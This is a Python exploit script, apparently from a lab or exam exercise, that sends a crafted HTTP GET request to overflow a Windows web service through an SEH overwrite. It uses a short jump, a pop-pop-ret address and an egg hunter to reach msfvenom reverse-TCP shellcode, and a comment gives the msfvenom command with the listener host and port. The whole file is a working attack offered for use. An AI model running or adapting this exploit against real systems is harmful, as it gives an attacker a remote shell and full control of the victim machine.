#!/usr/bin/env python

import socket

host = 'x.x.x.x'
port = 80

#original buffer
#buf = "\x41" * 5050

#[*] Exact match at offset 2488
#buf = "\x41" * 2484
buf = "\x41" * 1234
#msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -f c -b "\x00\x09\x0a\x0d\x20"
buf += "T00WT00W"
buf += ("\xd9\xcb\xbb\xfd\x07\xc9\xcb\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x58\x17\x83\xc0\x04\x03\xa5\x14\x2b\x3e\xa9\xf3\x29"
"\xc1\x51\x04\x4e\x4b\xb4\x35\x4e\x2f\xbd\x66\x7e\x3b\x93\x8a"
"\xf5\x69\x07\x18\x7b\xa6\x28\xa9\x36\x90\x07\x2a\x6a\xe0\x06"
"\xa8\x71\x35\xe8\x91\xb9\x48\xe9\xd6\xa4\xa1\xbb\x8f\xa3\x14"
"\x2b\xbb\xfe\xa4\xc0\xf7\xef\xac\x35\x4f\x11\x9c\xe8\xdb\x48"
"\x3e\x0b\x0f\xe1\x77\x13\x4c\xcc\xce\xa8\xa6\xba\xd0\x78\xf7"
"\x43\x7e\x45\x37\xb6\x7e\x82\xf0\x29\xf5\xfa\x02\xd7\x0e\x39"
"\x78\x03\x9a\xd9\xda\xc0\x3c\x05\xda\x05\xda\xce\xd0\xe2\xa8"
"\x88\xf4\xf5\x7d\xa3\x01\x7d\x80\x63\x80\xc5\xa7\xa7\xc8\x9e"
"\xc6\xfe\xb4\x71\xf6\xe0\x16\x2d\x52\x6b\xba\x3a\xef\x36\xd3"
"\x8f\xc2\xc8\x23\x98\x55\xbb\x11\x07\xce\x53\x1a\xc0\xc8\xa4"
"\x5d\xfb\xad\x3a\xa0\x04\xce\x13\x67\x50\x9e\x0b\x4e\xd9\x75"
"\xcb\x6f\x0c\xd9\x9b\xdf\xff\x9a\x4b\xa0\xaf\x72\x81\x2f\x8f"
"\x63\xaa\xe5\xb8\x0e\x51\x6e\x6b\xde\xeb\xea\x1b\xdd\x0b\xf2"
"\x60\x68\xed\x9e\x86\x3d\xa6\x36\x3e\x64\x3c\xa6\xbf\xb2\x39"
"\xe8\x34\x31\xbe\xa7\xbc\x3c\xac\x50\x4d\x0b\x8e\xf7\x52\xa1"
"\xa6\x94\xc1\x2e\x36\xd2\xf9\xf8\x61\xb3\xcc\xf0\xe7\x29\x76"
"\xab\x15\xb0\xee\x94\x9d\x6f\xd3\x1b\x1c\xfd\x6f\x38\x0e\x3b"
"\x6f\x04\x7a\x93\x26\xd2\xd4\x55\x91\x94\x8e\x0f\x4e\x7f\x46"
"\xc9\xbc\x40\x10\xd6\xe8\x36\xfc\x67\x45\x0f\x03\x47\x01\x87"
"\x7c\xb5\xb1\x68\x57\x7d\xc1\x22\xf5\xd4\x4a\xeb\x6c\x65\x17"
"\x0c\x5b\xaa\x2e\x8f\x69\x53\xd5\x8f\x18\x56\x91\x17\xf1\x2a"
"\x8a\xfd\xf5\x99\xab\xd7")
buf += "\x41" * 891

#eb08 jmp worked fine - no bad chars yet at this point
nseh = "\xeb\x08\x90\x90"
#original seh
#seh = "\x43" * 4

#after some trial and error, this pop, pop, ret worked
seh = "\x47\x37\x01\x10"

#egg hunter buf
nop1 = "\x90" * 8
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
buf2 = "\x44" * 2518

get = "GET /.:/" + buf + nseh + seh + nop1 + egghunter + buf2 + "\r\n"
hostheader = "Host: x.x.x.x\r\n"
useragent = "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
accept = "Accept: */*\r\n"
acceptlang = "Accept-Language: en-US,en;q=0.5\r\n"
acceptenc = "Accept-Encoding: gzip, deflate\r\n"
referer = "Referer: http://x.x.x.x/\r\n"
connection = "Connection: keep-alive\r\n"
end = "\r\n"

crash = get + hostheader + useragent + accept + acceptlang + acceptenc + referer + connection + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(crash)
